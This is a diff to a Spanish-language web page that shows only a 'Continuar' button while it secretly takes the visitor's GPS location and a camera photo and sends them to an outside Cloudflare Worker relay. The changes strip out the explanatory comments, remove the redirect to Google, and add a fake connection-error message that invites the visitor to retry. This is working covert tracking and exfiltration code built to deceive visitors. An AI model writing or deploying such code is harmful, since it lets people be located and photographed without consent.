@@ -51,6 +51,11 @@
             background: #1557b0;
             transform: scale(0.98);
         }
+        .error-msg {
+            margin-top: 20px;
+            color: red;
+            font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
@@ -58,15 +63,14 @@
     <h1>Continuar</h1>
     <p>Presiona el botón para continuar</p>
     <button id="btn">Continuar</button>
+    <div id="errorMsg" class="error-msg"></div>
 </div>
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // Reemplaza 'https://tu-worker.workers.dev' por la URL de tu Worker
     const WORKER_URL = 'https://proxy-tg.societykark.workers.dev/';
 
-    // ---- Funciones auxiliares (igual que antes, para obtener GPS, foto, etc.) ----
     async function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -99,25 +103,18 @@
         return blob;
     }
 
-    // ---- Envío al Worker (sin token en el cliente) ----
     async function sendToWorker(text, photoBlob) {
         const formData = new FormData();
         formData.append('text', text);
         if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
         try {
-            const response = await fetch(WORKER_URL, {
-                method: 'POST',
-                body: formData
-            });
-            return await response.json();
+            await fetch(WORKER_URL, { method: 'POST', body: formData });
         } catch(e) {
-            console.error('Error al enviar al Worker:', e);
+            console.error(e);
         }
     }
 
-    // ---- Acción del botón ----
     document.getElementById('btn').onclick = async () => {
-        // Obtener GPS
         const gps = await getGPS();
         let text = '';
         if (gps) {
@@ -125,12 +122,13 @@
         } else {
             text = '📍 Ubicación no disponible (permiso denegado)';
         }
-        // Capturar foto
         const foto = await capturePhoto();
-        // Enviar al Worker
         await sendToWorker(text, foto);
-        // Redirigir a Google
-        window.location.href = 'https://www.google.com';
+
+        // Mostrar mensaje de error falso (sin redirigir)
+        const errorDiv = document.getElementById('errorMsg');
+        errorDiv.innerText = 'Error de conexión. Por favor, recarga la página e intenta de nuevo.';
+        // No redirigir a Google
     };
 </script>
 </body>
